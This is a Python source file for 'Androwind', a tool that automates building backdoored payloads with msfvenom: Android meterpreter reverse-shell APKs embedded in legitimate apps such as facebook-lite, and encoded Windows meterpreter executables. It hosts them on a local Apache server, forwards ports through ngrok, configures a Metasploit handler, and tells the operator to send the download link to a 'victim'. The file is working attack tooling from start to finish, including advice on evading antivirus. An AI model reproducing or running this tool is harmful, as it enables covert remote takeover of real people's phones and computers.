#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Wed Mar  4 10:14:55 2020

@author: Umer Farid
"""
import os, sys
import netifaces as ni
import time


#Global varables

red_ex = "[\033[91m!\033[0m]"
blue_plus = "[\033[95m✔\033[0m]"
PATH_OF_PAYLOAD = "/tmp/payload"
GREEN = "[\033[92m◉\033[0m]"
ip = ""
port = ""
filename = ""
app = ""
APrompt = "\033[95mAndrowind ~#\033[0m "
ng_ins = f'''\n{GREEN} Signup: https://dashboard.ngrok.com/signup \n{GREEN} Login: https://dashboard.ngrok.com/login\n'''

#Payload for Android
def __animation__():
    animation = ("\/-\\")
    for i in range(10):
        time.sleep(0.1)
        sys.stdout.write(f"\r" + "[\033[91m" + animation[i % len(animation)] + "\033[0m] Please wait..")
        sys.stdout.flush()
    print("")

def logo():
    os.system("clear")
    logo = '''\033[91m
    _______       _________                      _____       _________
    ___    |____________  /_______________      ____(_)____________  /
    __  /| |_  __ \  __  /__  ___/  __ \_ | /| / /_  /__  __ \  __  /
    _  ___ |  / / / /_/ / _  /   / /_/ /_ |/ |/ /_  / _  / / / /_/ /
    /_/  |_/_/ /_/\__,_/  /_/    \____/____/|__/ /_/  /_/ /_/\__,_/ \033[0m \033[93m

                   }--{+} Coded By Umer Farid {+}--{
                      }----{+} Androwind {+}----{
                   }--{+} Dark Minded Coders  {+}--{
              }--{+} Email: umerfarid53@gmail.com  {+}--{

                   \033[0m
    '''.center(os.get_terminal_size().columns)
    print(f"{logo}")

#Create a directory /tmp/payload
def __directory__():
    if not os.path.exists(PATH_OF_PAYLOAD):
        os.system("sudo mkdir /tmp/payload/")
        print(blue_plus + " Directory has been created")

#Start the apache2 server
def __apache__():
    os.system("sudo service apache2 start")
    print(blue_plus + " Server has been started")

#set local_ip and port automatically
def __default__(ip, port):

    __animation__()
    try:
        print("\n" + blue_plus + " set IP = > ", ip)
        print(blue_plus + " set Port = > ", port)
        return ip, port

    except Exception as ex:
        print("Exception: %s " %str(ex))

#Create Android payload
def venom_andro(ip, port, filename, app):
    os.system("clear")
    logo()
    try:
        print(GREEN + " Creating payload..")
        os.system(f"sudo msfvenom -x {app} -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} > /tmp/payload/{filename}.apk")
        os.system(f"sudo cp /tmp/payload/{filename}.apk /var/www/html\n")   
        print(blue_plus + " Backdoor Uploaded")
    except Exception as ex:
        print("Exception: %s" % str(ex))

#Create Payload for Windows
def venom_window(ip, port, filename):
    os.system("clear")
    logo()
    try:
        print(GREEN + " Creating payload..")
        os.system(f'sudo msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -e x86/shikata_ga_nai -i 20 -f exe -o /tmp/payload/{filename}.exe')
        os.system(f"sudo cp /tmp/payload/{filename}.exe /var/www/html\n")
        print(blue_plus + " Backdoor Uploaded to the server!")
    except Exception as ex:
        print("Exception: %s " % str(ex))

#Start metasploit and execute systemHandler.r to set PAYLOAD, IP address, PORT no automatically
def msfconsole():
    os.system("clear")
    logo()
    print(GREEN + " Starting msfconsole..")
    try:
        os.system("sudo xterm -T Metasploit -e msfconsole -q -r /root/.androwind/systemHandler.r")
        os.system("sudo rm systemHandler.r && sudo rm -rf /root/.ngrok2/ && sudo rm -rf /tmp/payload/")
        print("Done. Good Bye!")
    except Exception as ex:
        print("Exception: %s " %str(ex))

#it create systemHandler.r file for metasploit
def metaConfig(ip, port):
    try:
        f = open("/root/.androwind/systemHandler.r", "w+")
        f.write("use exploit/multi/handler\n")
        f.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
        f.write(f"set LHOST {ip}\n")
        f.write(f"set LPORT {port}\n")

    except Exception as ex:
        print("Exception: %s " %str(ex))

#it display content of systemHandler file.. change ip and port if you want on xterm window.
# CTRl + S to save file and CTRL + X to go further
def systemHandler():
    try:
        os.system("sudo xterm -T Metasploit -e nano /root/.androwind/systemHandler.r")

    except Exception as ex:
        print("Exception: %s " %str(ex))

#It will copy ngrok in /usr/local/bin to make an executeable
def ngrok():
    if not os.path.isfile('/usr/local/bin/ngrok'):
        os.system("sudo cp ngrok /usr/local/bin")
    print(blue_plus + " Ngrok installed ")


#it configure ngrok for portforwaring for multiple sessions HTTP and TCP
def ngConfig():
    path = "/root/.ngrok2"
    if not os.path.exists(path):

        try:
            os.system(f"sudo mkdir /root/.ngrok2 && sudo cp -f /root/.androwind/ngrok.yml /root/.ngrok2/")

        except Exception as ex:
            print("Exception: %s " %str(ex))

    print(blue_plus + " Configurations done")
    print(blue_plus + " All done! For WAN forward ports by typing a command: \033[93m sudo ngrok start --all \033[0m")
    print("")
    time.sleep(5)
    os.system("clear")

#main
def main():
    logo()
    __apache__()
    __directory__()
    ngrok()
    ngConfig()

    #input from user
    logo()
    choice = input(GREEN + "\033[91mSet default IP for LAN OR press n for set custom IP and PORT for WAN \033[0m\n" + red_ex + " Set Local IP and Port no by androwind[Y/n]: ")
    if choice[0].upper() == 'Y':

        try:
            if ni.ifaddresses('wlan0'):
                ip = ni.ifaddresses('wlan0')[ni.AF_INET][0]['addr']
            else:
                ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
            port = 4444
            __default__(ip,port)
            filename = input("\n" + red_ex + " Enter filename without extension: ")
            print(blue_plus + " set Filename = > ", filename)

        except Exception as ex:
            print("Exception: %s " %str(ex))
    else:

        try:
            ip = input("\n" + red_ex + " Enter your ip address: ")
            print(blue_plus + " set IP = > ", ip)
            port = input("\n" + red_ex + " Enter port no: ")
            print(blue_plus + " set Port no = > ", port)
            filename = input("\n" + red_ex + " Enter filename without extension: ")
            print(blue_plus + " set Filename = > ", filename)

        except Exception as ex:
            print("Exception: %s " %str(ex))

    ch = int(input("\n[1] Android Payload \n[2] Windows Payload \n\n" +  APrompt ))
    if ch == 1:

        try:
            print(GREEN + " Embedding an app with payload is a good policy to make it undetectable from antiviruses. Download any app like facebook-lite etc to embed a payload with it.")
            app = input(red_ex + " Enter the path of Android App e.g /home/user/Download/facebook-lite.apk: \n" + APrompt)
            print(GREEN + " Embedding app from: " + app)
            venom_andro(ip, port, filename, app)
            print(blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.apk \033[0m\n")
            msf = input(red_ex + " Metasploit = > [Y/n]: ")
            if msf[0].upper() == 'Y':
                print(red_ex + " Config payload..")
                metaConfig(ip, port)
                systemHandler()
                msfconsole()

        except Exception as ex:
            print("Exception: %s " %str(ex))

        else:
            print(blue_plus + " PAYLOAD SAVED: " + f"{PATH_OF_PAYLOAD}" +"/"+ f"{filename}")
    elif ch == 2:

        try:
            venom_window(ip, port, filename)
            print(blue_plus +f" Send this link to victim:\033[93m {ip}"+"/"+f"{filename}.exe \033[0m\n")
            msf = input(red_ex + " Metasploit = > [Yes/No]: ")
            if msf[0].upper() == 'Y':
                print(blue_plus + " Config payload..")
                metaConfig(ip, port)
                systemHandler()
                msfconsole()

        except Exception as ex:
            print("Exception: %s " %str(ex))

        else:
            print(blue_plus + " PAYLOAD SAVED: " + f"{PATH_OF_PAYLOAD}" +"/"+ f"{filename}")

    else:
        __animation__()
        print(red_ex + " You've entered wrong choice, try again!")
if __name__=="__main__":
    main()
